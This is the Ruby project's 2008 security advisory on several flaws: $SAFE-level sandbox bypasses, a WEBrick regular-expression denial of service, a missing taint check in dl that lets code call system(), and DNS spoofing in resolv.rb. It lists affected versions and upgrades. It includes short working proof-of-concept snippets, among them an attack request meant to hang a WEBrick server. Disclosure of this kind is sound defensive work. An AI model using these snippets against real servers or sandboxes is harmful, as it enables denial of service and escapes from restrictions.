---
layout: page
title: Multiple vulnerabilities in Ruby
---

<p>Multiple vulnerabilities have been discovered in Ruby.  It's
recommended that you upgrade to the latest versions.</p>
<div id="extended">
<h2><a name="label-0" id="label-0">Details</a></h2>
<!-- RDLabel: "Details" --><p>The following vulnerabilities have been discovered.</p>
<h3><a name="label-1" id="label-1">Several vulnerabilities in safe level</a></h3>
<!-- RDLabel: "Several vulnerabilities in safe level" --><p>Several vulnerabilities in safe level have been discovered.</p>
<ul>
<li>
<p>untrace_var is permitted at safe level 4.</p>
<pre>trace_var(:$VAR) {|val| puts "$VAR = #{val}" }

Thread.new do
 $SAFE = 4
 eval %q{
   proc = untrace_var :$VAR
   proc.first.call("aaa")
 }
end.join</pre>
</li>
<li>
<p>$PROGRAM_NAME may be modified at safe level 4.</p>
<pre>Thread.new do
 $SAFE = 4
 eval %q{$PROGRAM_NAME.replace "Hello, World!"}
end.join

$PROGRAM_NAME #=&gt; "Hello, World!"</pre>
</li>
<li>
<p>Insecure methods may be called at safe level 1-3.</p>
<pre>class Hello
 def world
   Thread.new do
     $SAFE = 4
     msg = "Hello, World!"
     def msg.size
       self.replace self*10 # replace string
       1 # return wrong size
     end
     msg
   end.value
 end
end

$SAFE = 1 # or 2, or 3
s = Hello.new.world
if s.kind_of?(String)
 puts s if s.size &lt; 20 # print string which size is less than 20
end</pre>
</li>
<li>
<p>Syslog operations are permitted at safe level 4.</p>
<pre>require "syslog"

Syslog.open

Thread.new do
 $SAFE = 4
 eval %q{
   Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
   Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
   Syslog.info("masked")
   Syslog.close
 }
end.join</pre>
</li>
</ul>
<p>These vulnerabilities were reported by Keita Yamaguchi.</p>
<h3><a name="label-2" id="label-2">DoS vulnerability in WEBrick</a></h3>
<!-- RDLabel: "DoS vulnerability in WEBrick" --><p>WEBrick::HTTP::DefaultFileHandler is faulty of exponential time taking
requests due to a backtracking regular expression in
WEBrick::HTTPUtils.split_header_value.</p>
<p>Exploitable server:</p>
<pre>require 'webrick'
WEBrick::HTTPServer.new(:Port =&gt; 2000, :DocumentRoot =&gt; "/etc").start</pre>
<p>Attack:</p>
<pre>require 'net/http'
res = Net::HTTP.start("localhost", 2000) { |http|
  req = Net::HTTP::Get.new("/passwd")
  req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
  http.request(req)
}
p res</pre>
<p>The request likely won't finish in this universe.</p>
<p>This vulnerability was reported by Christian Neukirchen.</p>
<h3><a name="label-3" id="label-3">Lack of taintness check in dl</a></h3>
<!-- RDLabel: "Lack of taintness check in dl" --><p>dl doesn't check taintness, so it could allow attackers to call
dangerous functions.</p>
<pre>require 'dl'
$SAFE = 1
h = DL.dlopen(nil)
sys = h.sym('system', 'IP')
uname = 'uname -rs'.taint
sys[uname]</pre>
<p>This vulnerability was reported by sheepman.</p>
<h3><a name="label-4" id="label-4">DNS spoofing vulnerability in resolv.rb</a></h3>
<!-- RDLabel: "DNS spoofing vulnerability in resolv.rb" --><p>resolv.rb allow remote attackers to spoof DNS answers.  This risk can be
reduced by randomness of DNS transaction IDs and source ports, so resolv.rb
is fixed to randomize them.</p>
<ul>
<li>see also: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447">CVE-2008-1447</a>
</li>
</ul>
<p>This vulnerability was reported by Tanaka Akira.</p>
<h2><a name="label-5" id="label-5">Vulnerable versions</a></h2>
<!-- RDLabel: "Vulnerable versions" --><dl>
<dt><a name="label-6" id="label-6">1.8 series</a></dt>
<!-- RDLabel: "1.8 series" -->
<dd>
<ul>
<li>1.8.5 and all prior versions</li>
<li>1.8.6-p286 and all prior versions</li>
<li>1.8.7-p71 and all prior versions</li>
</ul>
</dd>
<dt><a name="label-7" id="label-7">1.9 series</a></dt>
<!-- RDLabel: "1.9 series" -->
<dd>
<ul>
<li>r18423 and all prior revisions</li>
</ul>
</dd>
</dl>
<h2><a name="label-8" id="label-8">Solution</a></h2>
<!-- RDLabel: "Solution" --><dl>
<dt><a name="label-9" id="label-9">1.8 series</a></dt>
<!-- RDLabel: "1.8 series" -->
<dd>
Please upgrade to 1.8.6-p287, or 1.8.7-p72. 
<ul>
<li><a href="ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz">&lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&gt;</a></li>
<li><a href="ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz">&lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&gt;</a></li>
</ul>
</dd>
<dt><a name="label-10" id="label-10">1.9 series</a></dt>
<!-- RDLabel: "1.9 series" -->
<dd>
<p>Please check out the latest version using Subversion.</p>
<pre>$ svn co http://svn.ruby-lang.org/repos/ruby/trunk ruby</pre>
</dd>
</dl>
<p>Please note that a package that corrects this weakness may already be
available through your package management software.</p>
<h2><a name="label-11" id="label-11">Credit</a></h2>
<!-- RDLabel: "Credit" --><p>Credit to Keita Yamaguchi, Christian Neukirchen, sheepman, and Tanaka
Akira for disclosing these problems to Ruby Security Team.</p>
<h2><a name="label-12" id="label-12">Changes</a></h2>
<!-- RDLabel: "Changes" --><ul>
<li>2008-08-08 12:21 +09:00  fixed the revision number of ruby 1.9.</li>
<li>2008-08-11 11:23 +09:00  fixed the patchlevel of ruby 1.8. see <a href="http://www.ruby-lang.org/en/news/2008/08/11/ruby-1-8-7-p72-and-1-8-6-p287-released/">the release announcement of Ruby 1.8.7-p72 and 1.8.6-p287</a>
</li>
</ul>
</div>
            
